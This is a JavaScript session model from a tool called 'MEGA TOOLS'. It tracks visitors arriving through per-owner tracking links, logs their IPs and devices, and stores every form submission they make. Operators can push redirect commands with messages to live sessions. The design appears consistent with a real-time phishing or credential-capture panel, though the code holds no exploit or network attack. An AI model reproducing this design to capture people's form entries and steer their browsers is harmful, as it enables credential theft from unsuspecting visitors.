// ============================================================
// MEGA TOOLS — SESSION MODEL (ENTERPRISE v7.0 DEDUPLICATED)
// v7.0: Duplicate formData prevention in upsert()
// ============================================================

const db = require('../database');
const { toStringId, generateId, now } = require('../utils/helpers');
const CONFIG = require('../config');

const SESSION_EXPIRY_MS = 7 * 24 * 60 * 60 * 1000;
const ACTIVE_SESSION_WINDOW_MS = 10 * 60 * 1000;
const SYSTEM_FIELDS = ['step','stepNumber','attempt','status','collectedTypes','screenResolution','timestamp','userAgent','platform','language','timezone','submittedAt','source','url','currentUrl','entryUrl','browser'];

function normalizeIP(ip) {
  if (!ip) return 'unknown';
  if (ip.startsWith('::ffff:')) return ip.replace('::ffff:', '');
  if (ip === '::1') return '127.0.0.1';
  return ip;
}

function getOwnerCode(trackingCode) {
  if (!trackingCode) return null;
  return trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
}

// v7.0: Helper — compare formData ignoring submittedAt
function isDuplicateSubmission(existingSubmissions, incomingFormData) {
  if (!existingSubmissions || existingSubmissions.length === 0) return false;
  
  const incomingClean = { ...incomingFormData };
  delete incomingClean.submittedAt;
  
  return existingSubmissions.some(sub => {
    const existingClean = { ...sub };
    delete existingClean.submittedAt;
    return JSON.stringify(existingClean) === JSON.stringify(incomingClean);
  });
}

async function create(data) {
  try {
    const nowISO = now();
    const normalizedIP = normalizeIP(data.ip || '::1');
    const ownerCode = getOwnerCode(data.trackingCode);

    const lockedKeys = [];
    const initialFormData = {};
    if (data.formData && Object.keys(data.formData).length > 0) {
      const keys = Object.keys(data.formData).filter(k => !SYSTEM_FIELDS.includes(k) && k !== 'submittedAt');
      for (let i = 0; i < keys.length; i++) {
        lockedKeys.push(keys[i]);
        initialFormData[keys[i]] = data.formData[keys[i]];
      }
    }

    const firstSubmission = data.formData && Object.keys(data.formData).length > 0
      ? [{ ...data.formData, submittedAt: nowISO }]
      : [];

    const isOffline = data.status === 'Offline';

    const session = {
      _id: generateId('s'),
      visitorId: data.visitorId || null,
      trackingCode: data.trackingCode || 'unknown',
      ownerCode: ownerCode || 'unknown',
      baseCode: data.baseCode || '',
      linkId: toStringId(data.linkId) || null,
      ip: normalizedIP,
      ipHistory: data.ip ? [{ ip: normalizedIP, timestamp: nowISO }] : [],
      browser: (data.browser || '').substring(0, 500),
      deviceType: data.deviceType || 'Desktop',
      entryUrl: data.entryUrl || data.baseCode || '',
      currentUrl: data.currentUrl || '',
      status: isOffline ? 'Offline' : 'Online',
      isLive: !isOffline,
      clicks: data.clicks || 1,
      collectedTypes: data.collectedTypes || [],
      submissions: firstSubmission,
      formData: initialFormData,
      lockedKeys: lockedKeys,
      hiddenBy: [],
      hiddenFor: [],
      hiddenForAll: false,
      seenBy: [],
      redirectHistory: [],
      identitySource: 'created',
      lastActivity: nowISO,
      timestamp: nowISO,
      created_at: nowISO,
      expiresAt: new Date(Date.now() + CONFIG.INBOX_GLOBAL_CYCLE_MS).toISOString(),
      updated_at: nowISO,
    };

    if (data.visitorId && ownerCode) {
      const existing = await db.sessions.findOne({ visitorId: data.visitorId, ownerCode, hiddenForAll: false });
      if (existing) return existing;
    }

    await db.sessions.insertOne(session);
    return session;
  } catch (error) {
    console.error('[Session] create error:', error.message);
    throw new Error(`Failed to create session: ${error.message}`);
  }
}

async function createAtomic(data) {
  return await create(data);
}

async function findById(id) {
  try {
    return await db.sessions.findById(id);
  } catch (error) {
    console.error('[Session] findById error:', error.message);
    throw new Error(`Failed to find session: ${error.message}`);
  }
}

async function findByVisitorId(visitorId, ownerCode = null) {
  try {
    if (!visitorId) return null;
    const filter = { visitorId, hiddenForAll: false };
    if (ownerCode) filter.ownerCode = ownerCode;
    return await db.sessions.findOne(filter);
  } catch (error) {
    console.error('[Session] findByVisitorId error:', error.message);
    throw new Error(`Failed to find session by visitor ID: ${error.message}`);
  }
}

async function findMany(filters = {}) {
  try {
    const dbFilter = {};
    if (filters.isLive !== undefined) dbFilter.isLive = filters.isLive;
    if (filters.status) dbFilter.status = filters.status;
    if (filters.deviceType) dbFilter.deviceType = filters.deviceType;
    if (filters.visitorId) dbFilter.visitorId = filters.visitorId;
    if (filters.ownerCode) dbFilter.ownerCode = filters.ownerCode;
    if (filters.hiddenForAll !== undefined) dbFilter.hiddenForAll = filters.hiddenForAll;
    else dbFilter.hiddenForAll = false;

    if (filters.trackingCode) {
      const code = getOwnerCode(filters.trackingCode);
      if (code) dbFilter.ownerCode = code;
    }

    const sessions = await db.sessions.find(dbFilter, {
      sort: { timestamp: -1 },
      limit: filters.limit || 100,
      skip: filters.skip || 0,
    });

    return sessions;
  } catch (error) {
    console.error('[Session] findMany error:', error.message);
    throw new Error(`Failed to find sessions: ${error.message}`);
  }
}

async function upsert(data) {
  try {
    const clientIp = normalizeIP(data.ip || '::1');
    const visitorId = data.visitorId || null;
    const trackingCode = data.trackingCode || null;
    const ownerCode = getOwnerCode(trackingCode);
    const nowMs = Date.now();

    let existing = null;
    let matchType = 'created';

    if (visitorId && ownerCode) {
      existing = await db.sessions.findOne({ visitorId, ownerCode, hiddenForAll: false });
      if (existing) {
        const createdTime = new Date(existing.created_at || existing.timestamp).getTime();
        if (nowMs - createdTime >= SESSION_EXPIRY_MS) {
          existing = null;
        } else {
          matchType = 'visitorId';
        }
      }
    }

    if (!existing && visitorId && trackingCode) {
      existing = await db.sessions.findOne({ visitorId, trackingCode, hiddenForAll: false });
      if (existing) matchType = 'visitorId+trackingCode';
    }

    if (!existing && ownerCode && clientIp) {
      const recentSessions = await db.sessions.find({
        ownerCode,
        ip: clientIp,
        hiddenForAll: false,
      }, { limit: 10, sort: { lastActivity: -1 } });

      existing = recentSessions.find(s => {
        const lastActivity = new Date(s.lastActivity || s.timestamp).getTime();
        return (nowMs - lastActivity) <= ACTIVE_SESSION_WINDOW_MS;
      }) || null;

      if (existing) matchType = 'ip+trackingCode';
    }

    if (existing) {
      if (visitorId && !existing.visitorId) existing.visitorId = visitorId;
      if (trackingCode) existing.trackingCode = trackingCode;
      if (ownerCode) existing.ownerCode = ownerCode;
      existing.currentUrl = data.currentUrl || existing.currentUrl;

      // ============================================================
      // v6.0 FIXED: Status logic — ONLY explicit status can change
      // ============================================================
      if (data.status === 'Offline') {
        existing.isLive = false;
        existing.status = 'Offline';
      } else if (data.status === 'Active') {
        // Only EXPLICIT 'Active' status can set Online
        existing.isLive = true;
        existing.status = 'Online';
      }
      // No status field OR undefined → DO NOT CHANGE STATUS
      // Heartbeat/visit/click কোনোভাবেই status পরিবর্তন করবে না

      existing.lastActivity = now();
      existing.identitySource = matchType;

      if (clientIp && normalizeIP(clientIp) !== normalizeIP(existing.ip)) {
        existing.ipHistory = existing.ipHistory || [];
        existing.ipHistory.push({ ip: clientIp, timestamp: now() });
        existing.ip = clientIp;
      }

      const skipClickTypes = ['heartbeat', 'session_init'];
      const hasOnlySystemTypes = data.collectedTypes?.length > 0 &&
        data.collectedTypes.every(t => skipClickTypes.includes(t));
      if (!hasOnlySystemTypes) existing.clicks = (existing.clicks || 0) + 1;

      if (data.linkId) existing.linkId = toStringId(data.linkId);
      if (data.baseCode) existing.baseCode = data.baseCode;
      if (data.entryUrl) existing.entryUrl = data.entryUrl;
      if (data.collectedTypes?.length > 0) {
        existing.collectedTypes = [...new Set([...(existing.collectedTypes || []), ...data.collectedTypes])];
      }

      // ============================================================
      // v7.0 FIXED: Duplicate submission prevention
      // ============================================================
      if (data.formData && Object.keys(data.formData).length > 0) {
        existing.submissions = existing.submissions || [];
        
        // Check duplicate — compare formData ignoring submittedAt
        if (!isDuplicateSubmission(existing.submissions, data.formData)) {
          existing.submissions.push({ ...data.formData, submittedAt: now() });
        }

        existing.lockedKeys = existing.lockedKeys || [];
        existing.formData = existing.formData || {};
        const newKeys = Object.keys(data.formData).filter(k => !SYSTEM_FIELDS.includes(k) && k !== 'submittedAt');
        newKeys.forEach(key => {
          if (!existing.lockedKeys.includes(key)) existing.lockedKeys.push(key);
          if (existing.formData[key] === undefined) existing.formData[key] = data.formData[key];
        });
      }

      if (data.browser) existing.browser = data.browser.substring(0, 500);
      if (data.deviceType) existing.deviceType = data.deviceType;
      existing.updated_at = now();

      await db.sessions.updateOne(existing._id, existing);
      return { session: existing, isNew: false, matchType };
    }

    const session = await create({ ...data, identitySource: 'created' });
    return { session, isNew: true, matchType: 'created' };
  } catch (error) {
    console.error('[Session] upsert error:', error.message);
    throw new Error(`Failed to upsert session: ${error.message}`);
  }
}

async function update(id, updates) {
  try {
    const safeUpdates = { ...updates };
    delete safeUpdates._id;
    safeUpdates.lastActivity = now();
    safeUpdates.updated_at = now();
    return await db.sessions.updateOne(id, safeUpdates);
  } catch (error) {
    console.error('[Session] update error:', error.message);
    throw new Error(`Failed to update session: ${error.message}`);
  }
}

async function remove(id) {
  try {
    return await db.sessions.deleteOne(id);
  } catch (error) {
    console.error('[Session] remove error:', error.message);
    throw new Error(`Failed to delete session: ${error.message}`);
  }
}

async function updatePresence(id, updates) {
  try {
    const allowedFields = ['status', 'isLive', 'lastActivity'];
    const safeUpdates = {};
    for (const key of allowedFields) {
      if (updates[key] !== undefined) safeUpdates[key] = updates[key];
    }
    if (Object.keys(safeUpdates).length === 0) return null;
    safeUpdates.updated_at = now();
    return await db.sessions.updateOne(id, safeUpdates);
  } catch (error) {
    console.error('[Session] updatePresence error:', error.message);
    throw new Error(`Failed to update presence: ${error.message}`);
  }
}

async function recordCommand(id, commandData) {
  try {
    const session = await db.sessions.findById(id);
    if (!session) return null;

    session.commandSeq = (session.commandSeq || 0) + 1;
    session.lastCommand = commandData.action || 'navigate';
    session.lastCommandUrl = commandData.url || '';
    session.lastMessage = commandData.message || '';
    session.lastActivity = now();
    session.redirectHistory = session.redirectHistory || [];
    session.redirectHistory.push({
      action: commandData.action || 'navigate',
      url: commandData.url || '',
      message: commandData.message || '',
      seq: session.commandSeq,
      timestamp: now()
    });

    if (commandData.url) {
      session.currentUrl = commandData.url;
      session.clicks = (session.clicks || 0) + 1;
    }

    session.updated_at = now();
    await db.sessions.updateOne(id, session);
    return session;
  } catch (error) {
    console.error('[Session] recordCommand error:', error.message);
    throw new Error(`Failed to record command: ${error.message}`);
  }
}

async function hideFromUser(id, userId) {
  try {
    const session = await db.sessions.findById(id);
    if (!session) return null;

    session.hiddenFor = session.hiddenFor || [];
    if (!session.hiddenFor.includes(toStringId(userId))) {
      session.hiddenFor.push(toStringId(userId));
    }
    await db.sessions.updateOne(id, session);
    return session;
  } catch (error) {
    console.error('[Session] hideFromUser error:', error.message);
    throw new Error(`Failed to hide session from user: ${error.message}`);
  }
}

async function markSeen(id, userId) {
  try {
    const session = await db.sessions.findById(id);
    if (!session) return null;

    session.seenBy = session.seenBy || [];
    const stringUserId = toStringId(userId);
    if (!session.seenBy.includes(stringUserId)) {
      session.seenBy.push(stringUserId);
    }
    session.updated_at = now();
    await db.sessions.updateOne(id, session);
    return session;
  } catch (error) {
    console.error('[Session] markSeen error:', error.message);
    throw new Error(`Failed to mark session as seen: ${error.message}`);
  }
}

async function count(filters = {}) {
  try {
    return await db.sessions.count(filters);
  } catch (error) {
    console.error('[Session] count error:', error.message);
    return 0;
  }
}

async function isSessionLive(session) {
  try {
    if (!session || !session.lastActivity) return false;
    const elapsed = Date.now() - new Date(session.lastActivity).getTime();
    return session.status === 'Online' && elapsed < CONFIG.SESSION_TIMEOUT_MS;
  } catch (error) {
    console.error('[Session] isSessionLive error:', error.message);
    return false;
  }
}

module.exports = {
  create,
  createAtomic,
  findById,
  findByVisitorId,
  findMany,
  upsert,
  update,
  remove,
  hideFromUser,
  markSeen,
  count,
  isSessionLive,
  updatePresence,
  recordCommand,
  normalizeIP,
  getOwnerCode,
};